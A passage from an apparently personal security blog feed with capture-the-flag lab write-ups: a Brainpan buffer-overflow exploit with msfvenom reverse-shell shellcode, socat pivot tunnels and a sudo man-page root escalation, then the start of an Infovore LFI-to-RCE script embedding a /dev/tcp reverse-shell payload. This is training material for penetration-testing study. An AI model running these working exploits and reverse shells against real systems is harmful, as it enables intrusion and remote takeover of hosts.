b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + after_eip


def buffer_exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.16", 9999))
    s.send(payload)
    s.close()


if __name__ == '__main__':

    buffer_exploit()

</code></pre></div></div>

<p>What we do here is simply send the bytearray to find the bad characters after writing the eip, so when we put our shellcode for the revershell in the script we will not have problems with bad characters</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 buffer-exploit-test.py

</code></pre></div></div>

<p>Now in Immunity we can see that it has been paused again, but what we are interested in doing is that in the ESP value we right click Follow and we can see our bytearray we can see character by character if there is one that is missing but there is a way faster using mona, as follows:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/match.png" alt="" /></p>

<p>Now what I mentioned before we can use <strong>!mona compare</strong> to specify with <strong>-f</strong> the path of the bytearray.bin and with <strong>-a</strong> indicating the address of the ESP to compare and as we seewe are not found no bad character</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/bad-xargs.png" alt="" /></p>

<p>Now we can create the shellcode with <strong>msfvenom</strong>. This will take care of giving us a revershell to our machine through the specified port</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.21 LPORT=3232 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xbe\x69\x3c\xfc\xa8\xda\xc3\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x52\x31\x72\x12\x03\x72\x12\x83\x83\xc0\x1e\x5d\xaf"
"\xd1\x5d\x9e\x4f\x22\x02\x16\xaa\x13\x02\x4c\xbf\x04\xb2"
"\x06\xed\xa8\x39\x4a\x05\x3a\x4f\x43\x2a\x8b\xfa\xb5\x05"
"\x0c\x56\x85\x04\x8e\xa5\xda\xe6\xaf\x65\x2f\xe7\xe8\x98"
"\xc2\xb5\xa1\xd7\x71\x29\xc5\xa2\x49\xc2\x95\x23\xca\x37"
"\x6d\x45\xfb\xe6\xe5\x1c\xdb\x09\x29\x15\x52\x11\x2e\x10"
"\x2c\xaa\x84\xee\xaf\x7a\xd5\x0f\x03\x43\xd9\xfd\x5d\x84"
"\xde\x1d\x28\xfc\x1c\xa3\x2b\x3b\x5e\x7f\xb9\xdf\xf8\xf4"
"\x19\x3b\xf8\xd9\xfc\xc8\xf6\x96\x8b\x96\x1a\x28\x5f\xad"
"\x27\xa1\x5e\x61\xae\xf1\x44\xa5\xea\xa2\xe5\xfc\x56\x04"
"\x19\x1e\x39\xf9\xbf\x55\xd4\xee\xcd\x34\xb1\xc3\xff\xc6"
"\x41\x4c\x77\xb5\x73\xd3\x23\x51\x38\x9c\xed\xa6\x3f\xb7"
"\x4a\x38\xbe\x38\xab\x11\x05\x6c\xfb\x09\xac\x0d\x90\xc9"
"\x51\xd8\x37\x99\xfd\xb3\xf7\x49\xbe\x63\x90\x83\x31\x5b"
"\x80\xac\x9b\xf4\x2b\x57\x4c\x3b\x03\x56\x99\xd3\x56\x58"
"\xad\x83\xde\xbe\xc7\xd3\xb6\x69\x70\x4d\x93\xe1\xe1\x92"
"\x09\x8c\x22\x18\xbe\x71\xec\xe9\xcb\x61\x99\x19\x86\xdb"
"\x0c\x25\x3c\x73\xd2\xb4\xdb\x83\x9d\xa4\x73\xd4\xca\x1b"
"\x8a\xb0\xe6\x02\x24\xa6\xfa\xd3\x0f\x62\x21\x20\x91\x6b"
"\xa4\x1c\xb5\x7b\x70\x9c\xf1\x2f\x2c\xcb\xaf\x99\x8a\xa5"
"\x01\x73\x45\x19\xc8\x13\x10\x51\xcb\x65\x1d\xbc\xbd\x89"
"\xac\x69\xf8\xb6\x01\xfe\x0c\xcf\x7f\x9e\xf3\x1a\xc4\xbe"
"\x11\x8e\x31\x57\x8c\x5b\xf8\x3a\x2f\xb6\x3f\x43\xac\x32"
"\xc0\xb0\xac\x37\xc5\xfd\x6a\xa4\xb7\x6e\x1f\xca\x64\x8e"
"\x0a";
</code></pre></div></div>

<p>Now we have to look for an address that applies a <strong>JMP ESP</strong> to interpret the shell_code, to do this we can do this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm &gt; JMP ESP
00000000  FFE4              jmp esp
nasm &gt; 
</code></pre></div></div>

<p>The Brainpan.exe program has no protection:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/protection.png" alt="" /></p>

<p>As a result we can see that it gives us an address that says <strong>Page_execute_Read</strong> so we can execute the shellcode</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/finaldirection.png" alt="" /></p>

<p>Therefore we have to copy that address because it will help us make a <strong>JMP ESP</strong> but we have to represent it in <strong>Little Endian</strong>, finally we have put some <strong>NOPS</strong> before executing the shellcode because it is necessary that can decrypt the encoder (x86/shikata_ga_nai) that we have applied in the shellcode created with msfvenon:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("&lt;I", 0x311712f3) # JMP ESP

shell_code = (b"\xbe\x69\x3c\xfc\xa8\xda\xc3\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x52\x31\x72\x12\x03\x72\x12\x83\x83\xc0\x1e\x5d\xaf"
b"\xd1\x5d\x9e\x4f\x22\x02\x16\xaa\x13\x02\x4c\xbf\x04\xb2"
b"\x06\xed\xa8\x39\x4a\x05\x3a\x4f\x43\x2a\x8b\xfa\xb5\x05"
b"\x0c\x56\x85\x04\x8e\xa5\xda\xe6\xaf\x65\x2f\xe7\xe8\x98"
b"\xc2\xb5\xa1\xd7\x71\x29\xc5\xa2\x49\xc2\x95\x23\xca\x37"
b"\x6d\x45\xfb\xe6\xe5\x1c\xdb\x09\x29\x15\x52\x11\x2e\x10"
b"\x2c\xaa\x84\xee\xaf\x7a\xd5\x0f\x03\x43\xd9\xfd\x5d\x84"
b"\xde\x1d\x28\xfc\x1c\xa3\x2b\x3b\x5e\x7f\xb9\xdf\xf8\xf4"
b"\x19\x3b\xf8\xd9\xfc\xc8\xf6\x96\x8b\x96\x1a\x28\x5f\xad"
b"\x27\xa1\x5e\x61\xae\xf1\x44\xa5\xea\xa2\xe5\xfc\x56\x04"
b"\x19\x1e\x39\xf9\xbf\x55\xd4\xee\xcd\x34\xb1\xc3\xff\xc6"
b"\x41\x4c\x77\xb5\x73\xd3\x23\x51\x38\x9c\xed\xa6\x3f\xb7"
b"\x4a\x38\xbe\x38\xab\x11\x05\x6c\xfb\x09\xac\x0d\x90\xc9"
b"\x51\xd8\x37\x99\xfd\xb3\xf7\x49\xbe\x63\x90\x83\x31\x5b"
b"\x80\xac\x9b\xf4\x2b\x57\x4c\x3b\x03\x56\x99\xd3\x56\x58"
b"\xad\x83\xde\xbe\xc7\xd3\xb6\x69\x70\x4d\x93\xe1\xe1\x92"
b"\x09\x8c\x22\x18\xbe\x71\xec\xe9\xcb\x61\x99\x19\x86\xdb"
b"\x0c\x25\x3c\x73\xd2\xb4\xdb\x83\x9d\xa4\x73\xd4\xca\x1b"
b"\x8a\xb0\xe6\x02\x24\xa6\xfa\xd3\x0f\x62\x21\x20\x91\x6b"
b"\xa4\x1c\xb5\x7b\x70\x9c\xf1\x2f\x2c\xcb\xaf\x99\x8a\xa5"
b"\x01\x73\x45\x19\xc8\x13\x10\x51\xcb\x65\x1d\xbc\xbd\x89"
b"\xac\x69\xf8\xb6\x01\xfe\x0c\xcf\x7f\x9e\xf3\x1a\xc4\xbe"
b"\x11\x8e\x31\x57\x8c\x5b\xf8\x3a\x2f\xb6\x3f\x43\xac\x32"
b"\xc0\xb0\xac\x37\xc5\xfd\x6a\xa4\xb7\x6e\x1f\xca\x64\x8e"
b"\x0a")

payload = before_eip + eip + b"\x90"*16 + shell_code


def buffer_exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.16", 9999))
    s.send(payload)


if __name__ == '__main__':

    buffer_exploit()
</code></pre></div></div>

<p>Now we can listen on port 3232 and execute the payload:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/pwd-windows.png" alt="" /></p>

<p>Finally, to finish compromising the Brainpan machine we have to do it with the real machine by passing the payload through the tunnels, but first we have to configure another tunnel that can give us access to a console:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Attacker
 rlwrap nc -nlvp 443
listening on [any] 443 ...

Aragog
root@Aragog:~# ./socat TCP-LISTEN:4245,fork TCP:192.168.1.21:443

Nagini
root@Nagini:~# ./socat TCP-LISTEN:2123,fork TCP:10.10.0.128:4245

Fawkes
root@Fawkes:~# ./socat TCP-LISTEN:4545,fork TCP:192.168.100.130:2123

Matrix
root@porteus:~# ./socat TCP-LISTEN:3232,fork TCP:192.168.100.128:4545
</code></pre></div></div>

<p>The previous payload no longer works because now the IP that we have to put is that of the Matrix machine because the tunnel begins so that it then goes to Fawkes &gt; Nagini &gt; Aragog &gt; Attacker machine:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> msfvenom -p windows/shell_reverse_tcp LHOST=172.18.0.130 LPORT=3232 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xdb\xd8\xd9\x74\x24\xf4\xba\xf6\x11\x34\x32\x5d\x33\xc9"
"\xb1\x52\x83\xed\xfc\x31\x55\x13\x03\xa3\x02\xd6\xc7\xb7"
"\xcd\x94\x28\x47\x0e\xf9\xa1\xa2\x3f\x39\xd5\xa7\x10\x89"
"\x9d\xe5\x9c\x62\xf3\x1d\x16\x06\xdc\x12\x9f\xad\x3a\x1d"
"\x20\x9d\x7f\x3c\xa2\xdc\x53\x9e\x9b\x2e\xa6\xdf\xdc\x53"
"\x4b\x8d\xb5\x18\xfe\x21\xb1\x55\xc3\xca\x89\x78\x43\x2f"
"\x59\x7a\x62\xfe\xd1\x25\xa4\x01\x35\x5e\xed\x19\x5a\x5b"
"\xa7\x92\xa8\x17\x36\x72\xe1\xd8\x95\xbb\xcd\x2a\xe7\xfc"
"\xea\xd4\x92\xf4\x08\x68\xa5\xc3\x73\xb6\x20\xd7\xd4\x3d"
"\x92\x33\xe4\x92\x45\xb0\xea\x5f\x01\x9e\xee\x5e\xc6\x95"
"\x0b\xea\xe9\x79\x9a\xa8\xcd\x5d\xc6\x6b\x6f\xc4\xa2\xda"
"\x90\x16\x0d\x82\x34\x5d\xa0\xd7\x44\x3c\xad\x14\x65\xbe"
"\x2d\x33\xfe\xcd\x1f\x9c\x54\x59\x2c\x55\x73\x9e\x53\x4c"
"\xc3\x30\xaa\x6f\x34\x19\x69\x3b\x64\x31\x58\x44\xef\xc1"
"\x65\x91\xa0\x91\xc9\x4a\x01\x41\xaa\x3a\xe9\x8b\x25\x64"
"\x09\xb4\xef\x0d\xa0\x4f\x78\x9e\x27\x4f\xfa\xb6\x45\x4f"
"\xf6\xe6\xc3\xa9\x6c\xf7\x85\x62\x19\x6e\x8c\xf8\xb8\x6f"
"\x1a\x85\xfb\xe4\xa9\x7a\xb5\x0c\xc7\x68\x22\xfd\x92\xd2"
"\xe5\x02\x09\x7a\x69\x90\xd6\x7a\xe4\x89\x40\x2d\xa1\x7c"
"\x99\xbb\x5f\x26\x33\xd9\x9d\xbe\x7c\x59\x7a\x03\x82\x60"
"\x0f\x3f\xa0\x72\xc9\xc0\xec\x26\x85\x96\xba\x90\x63\x41"
"\x0d\x4a\x3a\x3e\xc7\x1a\xbb\x0c\xd8\x5c\xc4\x58\xae\x80"
"\x75\x35\xf7\xbf\xba\xd1\xff\xb8\xa6\x41\xff\x13\x63\x61"
"\xe2\xb1\x9e\x0a\xbb\x50\x23\x57\x3c\x8f\x60\x6e\xbf\x25"
"\x19\x95\xdf\x4c\x1c\xd1\x67\xbd\x6c\x4a\x02\xc1\xc3\x6b"
"\x07";
</code></pre></div></div>

<p>Now in the script that we have created before we have to change the IP to attack with that of the Brainpan machine, in addition to using proxychains so that the payload can arrive:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("&lt;I", 0x311712f3) # JMP ESP

shell_code = (b"\xb8\xb1\xfa\xf7\xa2\xd9\xe8\xd9\x74\x24\xf4\x5b\x29\xc9"
b"\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x72\xfe\x15\x57\x88"
b"\x17\x5b\x98\x70\xe8\x3c\x10\x95\xd9\x7c\x46\xde\x4a\x4d"
b"\x0c\xb2\x66\x26\x40\x26\xfc\x4a\x4d\x49\xb5\xe1\xab\x64"
b"\x46\x59\x8f\xe7\xc4\xa0\xdc\xc7\xf5\x6a\x11\x06\x31\x96"
b"\xd8\x5a\xea\xdc\x4f\x4a\x9f\xa9\x53\xe1\xd3\x3c\xd4\x16"
b"\xa3\x3f\xf5\x89\xbf\x19\xd5\x28\x13\x12\x5c\x32\x70\x1f"
b"\x16\xc9\x42\xeb\xa9\x1b\x9b\x14\x05\x62\x13\xe7\x57\xa3"
b"\x94\x18\x22\xdd\xe6\xa5\x35\x1a\x94\x71\xb3\xb8\x3e\xf1"
b"\x63\x64\xbe\xd6\xf2\xef\xcc\x93\x71\xb7\xd0\x22\x55\xcc"
b"\xed\xaf\x58\x02\x64\xeb\x7e\x86\x2c\xaf\x1f\x9f\x88\x1e"
b"\x1f\xff\x72\xfe\x85\x74\x9e\xeb\xb7\xd7\xf7\xd8\xf5\xe7"
b"\x07\x77\x8d\x94\x35\xd8\x25\x32\x76\x91\xe3\xc5\x79\x88"
b"\x54\x59\x84\x33\xa5\x70\x43\x67\xf5\xea\x62\x08\x9e\xea"
b"\x8b\xdd\x31\xba\x23\x8e\xf1\x6a\x84\x7e\x9a\x60\x0b\xa0"
b"\xba\x8b\xc1\xc9\x51\x76\x82\x59\xb7\x78\xd0\xca\xba\x78"
b"\xd8\xaa\x32\x9e\x8a\xba\x12\x09\x23\x22\x3f\xc1\xd2\xab"
b"\x95\xac\xd5\x20\x1a\x51\x9b\xc0\x57\x41\x4c\x21\x22\x3b"
b"\xdb\x3e\x98\x53\x87\xad\x47\xa3\xce\xcd\xdf\xf4\x87\x20"
b"\x16\x90\x35\x1a\x80\x86\xc7\xfa\xeb\x02\x1c\x3f\xf5\x8b"
b"\xd1\x7b\xd1\x9b\x2f\x83\x5d\xcf\xff\xd2\x0b\xb9\xb9\x8c"
b"\xfd\x13\x10\x62\x54\xf3\xe5\x48\x67\x85\xe9\x84\x11\x69"
b"\x5b\x71\x64\x96\x54\x15\x60\xef\x88\x85\x8f\x3a\x09\xa5"
b"\x6d\xee\x64\x4e\x28\x7b\xc5\x13\xcb\x56\x0a\x2a\x48\x52"
b"\xf3\xc9\x50\x17\xf6\x96\xd6\xc4\x8a\x87\xb2\xea\x39\xa7"
b"\x96")

payload = before_eip + eip + b"\x90"*16 + shell_code


def buffer_exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.18.0.132", 9999))
    s.send(payload)


if __name__ == '__main__':

    buffer_exploit()

</code></pre></div></div>

<p>Now we are ready to execute the payload:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/pwd-brainpan.png" alt="" /></p>

<h2 id="got-root-4">Got Root</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Z:\&gt;dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\

  3/4/2013   1:02 PM  &lt;DIR&gt;         bin
  3/4/2013  11:19 AM  &lt;DIR&gt;         boot
  9/5/2024  11:12 AM  &lt;DIR&gt;         etc
  3/4/2013  11:49 AM  &lt;DIR&gt;         home
  3/4/2013  11:18 AM    15,084,717  initrd.img
  3/4/2013  11:18 AM    15,084,717  initrd.img.old
  3/4/2013   1:04 PM  &lt;DIR&gt;         lib
  3/4/2013  10:12 AM  &lt;DIR&gt;         lost+found
  3/4/2013  10:12 AM  &lt;DIR&gt;         media
 10/9/2012   9:59 AM  &lt;DIR&gt;         mnt
  3/4/2013  10:13 AM  &lt;DIR&gt;         opt
  3/7/2013  11:07 PM  &lt;DIR&gt;         root
  9/5/2024  11:32 AM  &lt;DIR&gt;         run
  3/4/2013  11:20 AM  &lt;DIR&gt;         sbin
 6/11/2012   9:43 AM  &lt;DIR&gt;         selinux
  3/4/2013  10:13 AM  &lt;DIR&gt;         srv
  9/5/2024  11:34 AM  &lt;DIR&gt;         tmp
  3/4/2013  10:13 AM  &lt;DIR&gt;         usr
  3/7/2013  11:13 PM  &lt;DIR&gt;         var
 2/25/2013   2:32 PM     5,180,432  vmlinuz
 2/25/2013   2:32 PM     5,180,432  vmlinuz.old
       4 files               40,530,298 bytes
      17 directories     13,848,055,808 bytes free


Z:\&gt;
</code></pre></div></div>

<p>This machine is curious because it has a Linux subsystem, we can apply the buffer over flow again but this time for a Linux system:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.18.0.130 LPORT=3232 -f c -b "\x00" EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xba\x22\x52\x63\x9b\xd9\xca\xd9\x74\x24\xf4\x5f\x29\xc9"
"\xb1\x12\x83\xef\xfc\x31\x57\x0e\x03\x75\x5c\x81\x6e\x48"
"\xbb\xb2\x72\xf9\x78\x6e\x1f\xff\xf7\x71\x6f\x99\xca\xf2"
"\x03\x3c\x65\xcd\xee\x3e\xcc\x4b\x08\x56\x63\xb9\xea\x24"
"\x13\xbc\xea\x24\x44\x49\x0b\x84\xe2\x1a\x9d\xb7\x59\x99"
"\x94\xd6\x53\x1e\xf4\x70\x02\x30\x8a\xe8\xb2\x61\x43\x8a"
"\x2b\xf7\x78\x18\xff\x8e\x9e\x2c\xf4\x5d\xe0";
</code></pre></div></div>

<p>We simply change the shellcode to the other one and execute:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains python3 buffer-exploit-linux.py

nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 56912
whoami
puck

</code></pre></div></div>

<p>After processing the tty we have executed the simple command to see what we can execute as sudo and we find this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$ ls /home
anansi  puck  reynard
puck@brainpan:/home/puck$ 
</code></pre></div></div>

<p>After seeing what this binary does we realize that it allows us to see the manual of the system binaries but as the <strong>root</strong> user it is an error because it allows us to launch an attempt.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls

LS(1)                                                                              User Commands                                                                              LS(1)

NAME
       ls - list directory contents

SYNOPSIS
       ls [OPTION]... [FILE]...

DESCRIPTION
       List information about the FILEs (the current directory by default).  Sort entries alphabetically if none of -cftuvSUX nor --sort is specified.

       Mandatory arguments to long options are mandatory for short options too.

       -a, --all
              do not ignore entries starting with .

       -A, --almost-all
              do not list implied . and ..

       --author
              with -l, print the author of each file

       -b, --escape
              print C-style escapes for nongraphic characters

       --block-size=SIZE
              scale sizes by SIZE before printing them.  E.g., `--block-size=M' prints sizes in units of 1,048,576 bytes.  See SIZE format below.

       -B, --ignore-backups
              do not list implied entries ending with ~

       -c     with -lt: sort by, and show, ctime (time of last modification of file status information) with -l: show ctime and sort by name otherwise: sort by ctime, newest first

       -C     list entries by columns

       --color[=WHEN]
              colorize the output.  WHEN defaults to `always' or can be `never' or `auto'.  More info below

       -d, --directory
              list directory entries instead of contents, and do not dereference symbolic links

       -D, --dired
              generate output designed for Emacs' dired mode

       -f     do not sort, enable -aU, disable -ls --color

       -F, --classify
!/bin/bash  

root@brainpan:/usr/share/man# whoami
root
root@brainpan:/usr/share/man#      
</code></pre></div></div>

<p>And putting <strong>!/bin/bash/</strong> we would be the user root.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@brainpan:~# cat b.txt 
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 



root@brainpan:~# 
</code></pre></div></div>

<p>Finally we finished the laboratory practice, it is very similar to <strong>eCPPTv2</strong> and even more complicated than the exam. I want to apologize if in any part of the entire report it has not been possible to understand it well, in any case I provide my email <strong>arc4.he@gmail.com</strong> I will be aware of any possible questions.</p>

<p>Arc4he.</p>]]></content><author><name>Arc4he</name><email>arc4.he@gmail.com</email></author><category term="vulnhub" /><category term="Certification" /><category term="Pivoting" /><category term="eCPPTv2" /><category term="john" /><category term="WordPress" /><category term="wpscan" /><category term="scripting" /><category term="Vmware" /><category term="Buffer Over Flow" /><category term="mysql" /><category term="SSRF" /><category term="BurpSuite" /><category term="Privilege Escalation" /><category term="Python3" /><summary type="html"><![CDATA[This time we will perform a simulation of the eCPPTv2 exam, in which we will have to compromise an entire network of computers using **Pivoting**, all in a local environment using VMware.]]></summary></entry><entry><title type="html">Infovore - VulnHub</title><link href="http://localhost:4000/vulnhub-infovore/" rel="alternate" type="text/html" title="Infovore - VulnHub" /><published>2024-08-15T00:00:00-06:00</published><updated>2024-08-15T00:00:00-06:00</updated><id>http://localhost:4000/vulnhub-infovore</id><content type="html" xml:base="http://localhost:4000/vulnhub-infovore/"><![CDATA[<p><img src="/assets/images/2024-08-15-vulnhub-infovore/web_interface.png" alt="" /></p>

<h1 id="hack-the-machine">Hack The Machine</h1>

<p>This is an easy to intermediate box that shows you how you can exploit innocent looking php functions and lazy sys admins.</p>

<p>There are 4 flags in total to be found, and you will have to think outside the box and try alternative ways to achieve your goal of capturing all flags.</p>

<h2 id="portscan">PortScan</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.94SVN scan initiated Thu Aug 15 17:37:03 2024 as: nmap -sCV -p80 -oN target 192.168.1.22
Nmap scan report for 192.168.1.22
Host is up (0.00035s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Include me ...
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:68:8A:B4 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 15 17:37:10 2024 -- 1 IP address (1 host up) scanned in 7.02 seconds
</code></pre></div></div>

<h2 id="webserver">WebServer</h2>

<p><img src="/assets/images/2024-08-15-vulnhub-infovore/web_interface_2.png" alt="" /></p>

<p>We analyzed the website extensively but found nothing. So we start with fuzzing:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://192.168.1.22/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,php.bak,php.back,bak,back,txt-t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,php.bak,php.back,bak,back,txt-t
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 4743]
/img                  (Status: 301) [Size: 310] [--&gt; http://192.168.1.22/img/]
/info.php             (Status: 200) [Size: 69767]
/css                  (Status: 301) [Size: 310] [--&gt; http://192.168.1.22/css/]
/vendor               (Status: 301) [Size: 313] [--&gt; http://192.168.1.22/vendor/]
Progress: 26513 / 1543927 (1.72%)^C
</code></pre></div></div>
<p>We are interested in <strong>phpinfo</strong> because it gives us a lot of information about the server and directives that are applied. Looking at the <strong>phpinfo</strong> we find the following actives directives:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Directive	    Local Value	    Master Value
allow_url_fopen	   On	            On 
file_uploads	   On	            On
</code></pre></div></div>

<p><img src="/assets/images/2024-08-15-vulnhub-infovore/phpinfo.png" alt="" /></p>

<p><strong>File Uploads</strong> allows us to upload a file to the server, but first we need a LFI and then convert it to a RCE. To find the LFI we have to do the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hl=136 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://192.168.1.22/index.php?FUZZ=/etc/passwd"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.22/index.php?FUZZ=/etc/passwd
Total requests: 1273833

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000028911:   200        26 L     33 W       1006 Ch     "filename"  
</code></pre></div></div>

<p><img src="/assets/images/2024-08-15-vulnhub-infovore/passwd-list.png" alt="" /></p>

<p>At this point we find a <strong>LFI</strong>, then we use the following exploit to automate this process:</p>

<p>Link: <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo">phpinfolfi.py</a></p>

<p>But this exploit needs some changes:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>In this function we have to change the values for our values, like that:

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
&lt;?php system("bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.21/443 0&gt;&amp;1'"); ?&gt;\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /index.php?filename=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r

